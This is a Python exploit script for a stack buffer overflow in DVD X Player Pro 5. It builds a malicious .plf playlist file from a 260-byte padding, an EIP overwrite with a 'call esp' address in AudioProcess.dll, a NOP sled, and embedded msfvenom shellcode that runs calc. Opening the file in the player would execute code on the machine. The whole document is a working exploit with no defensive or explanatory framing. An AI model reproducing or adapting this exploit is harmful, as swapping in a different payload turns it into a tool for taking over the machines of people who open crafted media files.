# EIP Overwrite buffer overflow for DVD X Player Pro 5

import struct

def gen_string(offset):
	# msfvenom -p windows/exec CMD="calc" -f python -b "\x00\x0a\x1a"
	buf =  ""
	buf += "\xd9\xe1\xd9\x74\x24\xf4\xba\x17\x01\x6c\xae\x5f\x29"
	buf += "\xc9\xb1\x30\x31\x57\x18\x83\xef\xfc\x03\x57\x03\xe3"
	buf += "\x99\x52\xc3\x61\x61\xab\x13\x06\xeb\x4e\x22\x06\x8f"
	buf += "\x1b\x14\xb6\xdb\x4e\x98\x3d\x89\x7a\x2b\x33\x06\x8c"
	buf += "\x9c\xfe\x70\xa3\x1d\x52\x40\xa2\x9d\xa9\x95\x04\x9c"
	buf += "\x61\xe8\x45\xd9\x9c\x01\x17\xb2\xeb\xb4\x88\xb7\xa6"
	buf += "\x04\x22\x8b\x27\x0d\xd7\x5b\x49\x3c\x46\xd0\x10\x9e"
	buf += "\x68\x35\x29\x97\x72\x5a\x14\x61\x08\xa8\xe2\x70\xd8"
	buf += "\xe1\x0b\xde\x25\xce\xf9\x1e\x61\xe8\xe1\x54\x9b\x0b"
	buf += "\x9f\x6e\x58\x76\x7b\xfa\x7b\xd0\x08\x5c\xa0\xe1\xdd"
	buf += "\x3b\x23\xed\xaa\x48\x6b\xf1\x2d\x9c\x07\x0d\xa5\x23"
	buf += "\xc8\x84\xfd\x07\xcc\xcd\xa6\x26\x55\xab\x09\x56\x85"
	buf += "\x14\xf5\xf2\xcd\xb8\xe2\x8e\x8f\xd6\xf5\x1d\xaa\x94"
	buf += "\xf6\x1d\xb5\x88\x9e\x2c\x3e\x47\xd8\xb0\x95\x2c\x16"
	buf += "\xfb\xb4\x04\xbf\xa2\x2c\x15\xa2\x54\x9b\x59\xdb\xd6"
	buf += "\x2e\x21\x18\xc6\x5a\x24\x64\x40\xb6\x54\xf5\x25\xb8"
	buf += "\xcb\xf6\x6f\xdb\x8a\x64\xf3\x1c"
  # call esp found at 0x011ca83b in AudioProcess.dll
	eip = struct.pack("<I", 0x011ca83b)
	nops = "\x90"*32
	pattern = "A"*offset + eip + nops + nops + buf
	file = open("dvdpro_crash.plf", "w")
	file.write(pattern)
	file.close()
  # open generated .plf file with the application

def main():
  # offset for EIP found via manual fuzzing
	offset = 260
	crash_string = gen_string(offset)

if __name__ == "__main__":
	main()
